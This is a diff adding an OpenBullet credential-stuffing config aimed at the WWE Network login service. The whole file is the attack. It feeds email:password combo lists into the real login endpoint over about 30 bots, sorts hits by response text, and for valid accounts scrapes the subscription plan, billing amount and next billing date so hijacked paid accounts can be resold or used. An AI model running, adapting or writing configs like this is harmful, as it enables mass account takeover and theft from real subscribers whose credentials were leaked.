@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "WWE",
+  "SuggestedBots": 30,
+  "LastModified": "2019-04-06T11:16:27.2147098+02:00",
+  "AdditionalInfo": "",
+  "Author": "Tranks",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Try REQUEST GET "https://secure.net.wwe.com/enterworkflow.do?flowId=account.login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#Login REQUEST POST "https://secure.net.wwe.com/workflow.do" 
+  CONTENT "registrationAction=identify&emailAddress=<USER>&password=<PASS>&submitButton=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://secure.net.wwe.com" 
+  HEADER "Referer: https://secure.net.wwe.com/enterworkflow.do?flowId=account.login" 
+#CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Authentication Error. Please check email and/or password and try again" 
+  KEYCHAIN Success OR 
+    KEY "My Profile" 
+#Try_Agin REQUEST GET "https://secure.net.wwe.com/enterworkflow.do?flowId=subscriptions.updatesubscription" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://secure.net.wwe.com" 
+#Tranks_1 PARSE "<SOURCE>" LR "Your next billing date is <b>" "</b>" -> CAP "Renew" 
+#Tranks_2 PARSE "<SOURCE>" LR "<p>You will be billed" "." -> CAP "You will be billed" 
+#Tranks_3 PARSE "<SOURCE>" LR "<p>You are currently subscribed to <b>" "</b>" -> CAP "subscribed to " "" "   |By:Tranks" 
